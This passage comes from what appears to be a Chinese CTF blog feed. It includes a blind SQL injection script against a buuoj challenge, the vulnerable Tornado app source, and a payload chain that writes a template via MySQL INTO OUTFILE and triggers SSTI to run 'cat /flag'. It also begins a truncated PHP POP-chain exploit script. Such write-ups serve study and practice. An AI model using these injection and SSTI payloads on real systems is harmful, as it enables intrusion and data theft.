class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">300</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>,<span class="hljs-number">130</span>):<br>        <span class="hljs-comment"># payload = url  + &quot;username=&quot; + &quot;&#x27; or if(ascii(substr(select FILE_NAME FROM performance_schema.file_instances limit 150,1))&gt;&quot;</span><br>        url = <span class="hljs-string">&quot;http://5af86460-e42f-4f41-9eb0-b2ce7064ae5d.node4.buuoj.cn/register.php?username=&#x27; or  if((ascii(substr((select INFO  FROM information_schema.processlist limit 0,1),&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;,1)) in (&quot;</span>+<span class="hljs-built_in">str</span>(j)+<span class="hljs-string">&quot;)),1,0) or &#x27;0&amp;password=12&quot;</span><br>        <span class="hljs-comment"># print(url)</span><br>        <span class="hljs-comment"># s = requests.session()</span><br>        <span class="hljs-comment"># print(url)</span><br>        r = requests.get(url)<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;this username&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            payload += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(payload)<br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure><p>跑出来是<code>SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where  qwbqwbqwbuser=&#39;&#39; or  if((ascii(substr((select INFO  FROM information_schema.processlist limit 0,1),1后面就是payload，省略</code></p><p>可以看到表为<code>qwbtttaaab111e</code>，字段为<code>qwbqwbqwbuser,qwbqwbqwbpass</code></p><p>则payload为<code>username=&#39; or  if((ascii(substr((select qwbqwbqwbpass FROM qwbtttaaab111e limit 0,1),&quot;+str(i)+&quot;,1)) in (&quot;+str(j)+&quot;)),1,0) or &#39;0&amp;password=12&quot;</code></p><p>得到密码，glzjin666888</p><p><img src="https://img-blog.csdnimg.cn/20210717211514175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>但是buu上好像无法登录不知道为什么。直接找到源码审计吧</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tornado.ioloop, tornado.web, tornado.options, pymysql, os, re<br>settings = &#123;<span class="hljs-string">&#x27;static_path&#x27;</span>: os.path.join(os.getcwd(), <span class="hljs-string">&#x27;static&#x27;</span>),<br> <span class="hljs-string">&#x27;cookie_secret&#x27;</span>: <span class="hljs-string">&#x27;b93a9960-bfc0-11eb-b600-002b677144e0&#x27;</span>&#125;<br>db_username = <span class="hljs-string">&#x27;root&#x27;</span><br>db_password = <span class="hljs-string">&#x27;xxxx&#x27;</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        user = self.get_secure_cookie(<span class="hljs-string">&#x27;user&#x27;</span>)<br>        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">and</span> user == <span class="hljs-string">b&#x27;admin&#x27;</span>:<br>            self.redirect(<span class="hljs-string">&#x27;/admin.php&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>            <span class="hljs-keyword">return</span><br>        self.render(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        username = self.get_argument(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        password = self.get_argument(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> password:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.get_secure_cookie(<span class="hljs-string">&#x27;user&#x27;</span>):<br>                self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`please input your password and username`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">if</span> self.get_secure_cookie(<span class="hljs-string">&#x27;user&#x27;</span>) == <span class="hljs-string">b&#x27;admin&#x27;</span>:<br>                self.redirect(<span class="hljs-string">&#x27;/admin.php&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>            <span class="hljs-keyword">else</span>:<br>                self.redirect(<span class="hljs-string">&#x27;/&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">else</span>:<br>            conn = pymysql.connect(<span class="hljs-string">&#x27;localhost&#x27;</span>, db_username, db_password, <span class="hljs-string">&#x27;qwb&#x27;</span>)<br>            cursor = conn.cursor()<br>            cursor.execute(<span class="hljs-string">&#x27;SELECT * from qwbtttaaab111e where qwbqwbqwbuser=%s and qwbqwbqwbpass=%s&#x27;</span>, [username, password])<br>            results = cursor.fetchall()<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(results) != <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span> results[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>                    self.set_secure_cookie(<span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>)<br>                    cursor.close()<br>                    conn.commit()<br>                    conn.close()<br>                    self.redirect(<span class="hljs-string">&#x27;/admin.php&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>                    <span class="hljs-keyword">return</span><br>                <span class="hljs-keyword">else</span>:<br>                    cursor.close()<br>                    conn.commit()<br>                    conn.close()<br>                    self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`login success, but only admin can get flag`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>                    <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">else</span>:<br>                cursor.close()<br>                conn.commit()<br>                conn.close()<br>                self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`your username or password is error`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RegisterHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        username = self.get_argument(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        password = self.get_argument(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        word_bans = [<span class="hljs-string">&#x27;table&#x27;</span>, <span class="hljs-string">&#x27;col&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;union&#x27;</span>, <span class="hljs-string">&#x27;inno&#x27;</span>, <span class="hljs-string">&#x27;like&#x27;</span>, <span class="hljs-string">&#x27;regexp&#x27;</span>]<br>        bans = [<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;--&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>]<br>        <span class="hljs-keyword">for</span> ban <span class="hljs-keyword">in</span> word_bans:<br>            <span class="hljs-keyword">if</span> re.search(ban, username, re.IGNORECASE):<br>                self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br><br>        <span class="hljs-keyword">for</span> ban <span class="hljs-keyword">in</span> bans:<br>            <span class="hljs-keyword">if</span> ban <span class="hljs-keyword">in</span> username:<br>                self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> password:<br>            self.render(<span class="hljs-string">&#x27;register.html&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>            self.render(<span class="hljs-string">&#x27;register.html&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br>        conn = pymysql.connect(<span class="hljs-string">&#x27;localhost&#x27;</span>, db_username, db_password, <span class="hljs-string">&#x27;qwb&#x27;</span>)<br>        cursor = conn.cursor()<br>        <span class="hljs-keyword">try</span>:<br>            cursor.execute(<span class="hljs-string">&quot;SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where qwbqwbqwbuser=&#x27;%s&#x27;&quot;</span> % username)<br>            results = cursor.fetchall()<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(results) != <span class="hljs-number">0</span>:<br>                self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`this username had been used`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>                conn.commit()<br>                conn.close()<br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">except</span>:<br>            conn.commit()<br>            conn.close()<br>            self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        <span class="hljs-keyword">try</span>:<br>            cursor.execute(<span class="hljs-string">&#x27;insert into qwbtttaaab111e (qwbqwbqwbuser, qwbqwbqwbpass) values(%s, %s)&#x27;</span>, [username, password])<br>            conn.commit()<br>            conn.close()<br>            self.finish(<span class="hljs-string">&quot;&lt;script&gt;alert(`success`);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">except</span>:<br>            conn.rollback()<br>            conn.close()<br>            self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogoutHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        self.clear_all_cookies()<br>        self.redirect(<span class="hljs-string">&#x27;/&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AdminHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        user = self.get_secure_cookie(<span class="hljs-string">&#x27;user&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user <span class="hljs-keyword">or</span> user != <span class="hljs-string">b&#x27;admin&#x27;</span>:<br>            self.redirect(<span class="hljs-string">&#x27;/index.php&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>            <span class="hljs-keyword">return</span><br>        self.render(<span class="hljs-string">&#x27;admin.html&#x27;</span>)<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ImageHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        user = self.get_secure_cookie(<span class="hljs-string">&#x27;user&#x27;</span>)<br>        image_name = self.get_argument(<span class="hljs-string">&#x27;qwb_image_name&#x27;</span>, <span class="hljs-string">&#x27;header.jpeg&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> image_name:<br>            self.redirect(<span class="hljs-string">&#x27;/&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user <span class="hljs-keyword">or</span> user != <span class="hljs-string">b&#x27;admin&#x27;</span>:<br>                self.redirect(<span class="hljs-string">&#x27;/&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>                <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">if</span> image_name.endswith(<span class="hljs-string">&#x27;.py&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> image_name <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> image_name:<br>                self.finish(<span class="hljs-string">&quot;nonono, you can&#x27;t read it.&quot;</span>)<br>                <span class="hljs-keyword">return</span><br>            image_name = os.path.join(os.getcwd() + <span class="hljs-string">&#x27;/image&#x27;</span>, image_name)<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(image_name, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> (f):<br>                img = f.read()<br>            self.set_header(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>)<br>            self.finish(img)<br>            <span class="hljs-keyword">return</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SecretHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tornado.web.RequestHandler._template_loaders):<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tornado.web.RequestHandler._template_loaders:<br>                tornado.web.RequestHandler._template_loaders[i].reset()<br><br>        msg = self.get_argument(<span class="hljs-string">&#x27;congratulations&#x27;</span>, <span class="hljs-string">&#x27;oh! you find it&#x27;</span>)<br>        bans = []<br>        <span class="hljs-keyword">for</span> ban <span class="hljs-keyword">in</span> bans:<br>            <span class="hljs-keyword">if</span> ban <span class="hljs-keyword">in</span> msg:<br>                self.finish(<span class="hljs-string">&#x27;bad hack,go out!&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;congratulations.html&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> (f):<br>            f.write(<span class="hljs-string">&#x27;&lt;html&gt;&lt;head&gt;&lt;title&gt;congratulations&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;%s&quot;);location.href=\&#x27;/admin.php\&#x27;;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n&#x27;</span> % msg)<br>            f.flush()<br>        self.render(<span class="hljs-string">&#x27;congratulations.html&#x27;</span>)<br>        <span class="hljs-keyword">if</span> tornado.web.RequestHandler._template_loaders:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tornado.web.RequestHandler._template_loaders:<br>                tornado.web.RequestHandler._template_loaders[i].reset()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_app</span>():</span><br>    <span class="hljs-keyword">return</span> tornado.web.Application([<br>     (<br>      <span class="hljs-string">&#x27;/index.php&#x27;</span>, MainHandler),<br>     (<br>      <span class="hljs-string">&#x27;/login.php&#x27;</span>, LoginHandler),<br>     (<br>      <span class="hljs-string">&#x27;/logout.php&#x27;</span>, LogoutHandler),<br>     (<br>      <span class="hljs-string">&#x27;/register.php&#x27;</span>, RegisterHandler),<br>     (<br>      <span class="hljs-string">&#x27;/admin.php&#x27;</span>, AdminHandler),<br>     (<br>      <span class="hljs-string">&#x27;/qwbimage.php&#x27;</span>, ImageHandler),<br>     (<br>      <span class="hljs-string">&#x27;/good_job_my_ctfer.php&#x27;</span>, SecretHandler),<br>     (<br>      <span class="hljs-string">&#x27;/&#x27;</span>, MainHandler)], **settings)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app = make_app()<br>    app.listen(<span class="hljs-number">8000</span>)<br>    tornado.ioloop.IOLoop.current().start()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;start&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>具体漏洞出现在</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">msg = self.get_argument(<span class="hljs-string">&#x27;congratulations&#x27;</span>, <span class="hljs-string">&#x27;oh! you find it&#x27;</span>)<br>        bans = []<br>        <span class="hljs-keyword">for</span> ban <span class="hljs-keyword">in</span> bans:<br>            <span class="hljs-keyword">if</span> ban <span class="hljs-keyword">in</span> msg:<br>                self.finish(<span class="hljs-string">&#x27;bad hack,go out!&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;congratulations.html&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> (f):<br>            f.write(<span class="hljs-string">&#x27;&lt;html&gt;&lt;head&gt;&lt;title&gt;congratulations&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;%s&quot;);location.href=\&#x27;/admin.php\&#x27;;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n&#x27;</span> % msg)<br>            f.flush()<br></code></pre></div></td></tr></table></figure><p>接受了一个<code>congratulations</code>参数，明显的是SSTI模板注入</p><p>得到源码后,过滤了<code>&#123;&#123;&#125;&#125;</code>标签，那么我们可用的只有<code>&#123;%%&#125;</code>标签，而剩下的操作名中，有一个操作是比较危险的，那就是extends操作，它的参数为一个文件名，该文件将会被作为模板文件被包含，并被渲染。那么如果我们包含一个带有恶意SSTI的payload的字符串的文件，那么是可以执行该SSTI的payload的。因此我们现在需要往服务器上上传一个恶意文件。</p><p>如何往服务器上上传文件呢.根据前文信息，我们可以得知该python应用为mysql用户权限启动，那么我们可以直接考虑通过mysql的<code>into outfile</code>语句写文件。这里分为两步，首先是往数据库里写东西，这个可以直接通过注册功能实现，第二步是将数据库里的数据导出至文件，在mysql中默认导出目录为<code>/var/lib/mysql-files/</code>，其他目录是没有导出权限的，因此我们将文件导出至该文件夹。<br>payload如下：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">/register.php?username=guoke&amp;password=&#123;% set <span class="hljs-keyword">return</span> __import__(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&quot;cat  /flag&quot;</span>).read()%&#125;<br>/register.php?username=guoke<span class="hljs-string">&#x27; into outfile &#x27;</span>/<span class="hljs-keyword">var</span>/lib/mysql-files/guoke&amp;password=<span class="hljs-number">123</span><br>/good_job_my_ctfer.php?congratulations=&#123;% <span class="hljs-keyword">extends</span> /<span class="hljs-keyword">var</span>/lib/mysql-files/guoke%&#125;<br><br></code></pre></div></td></tr></table></figure><p>最后得到flag<br><img src="https://img-blog.csdnimg.cn/20210717222121119.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网被-popmaster</title>
    <link href="/2021/07/14/2021-7-14-popmaster/"/>
    <url>/2021/07/14/2021-7-14-popmaster/</url>
    
    <content type="html"><![CDATA[<h2 id="popmaster"><a href="#popmaster" class="headerlink" title="popmaster"></a>popmaster</h2><p>exp如下(node为节点)：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> nose<br><span class="hljs-keyword">from</span> phply <span class="hljs-keyword">import</span> phplex<br><span class="hljs-keyword">from</span> phply.phpparse <span class="hljs-keyword">import</span>  make_parser<br><span class="hljs-keyword">from</span>  phply.phpast <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pprint<br>parser = make_parser() <br>func_name = <span class="hljs-string">&quot;BFda7w&quot;</span><br>con = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C:\\Users\\86130\\Desktop\\popmaster.php&quot;</span>).read()<br>lexer = phplex.lexer.clone()<br>lexer.filename = <span class="hljs-literal">None</span><br>output = parser.parse(con, lexer=lexer) <span class="hljs-comment">#输出抽象语法树</span><br>functions = &#123;&#125;<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> out <span class="hljs-keyword">in</span> output:<br>    class_name = out.name<br>    <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> out.nodes:<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == Method):<br>            functions[node.name] = out<br>target = functions[func_name]<br><span class="hljs-comment"># print(target)</span><br><span class="hljs-comment"># 强赋值函数直接跳过</span><br><br>skip_func = [<span class="hljs-string">&quot;F03wGk&quot;</span>, <span class="hljs-string">&quot;c3BsKT&quot;</span> ,<span class="hljs-string">&quot;C2S8YY&quot;</span> ,<span class="hljs-string">&quot;g5uQo2&quot;</span> ,<span class="hljs-string">&quot;mdNq2Z&quot;</span> ,<span class="hljs-string">&quot;CpBMKR&quot;</span> ,<span class="hljs-string">&quot;xYClcr&quot;</span>,<span class="hljs-string">&quot;RhTsLz&quot;</span>,<span class="hljs-string">&quot;rivyS9&quot;</span>,<span class="hljs-string">&quot;sIm1Q9&quot;</span>,<span class="hljs-string">&quot;qMKDLp&quot;</span>,<span 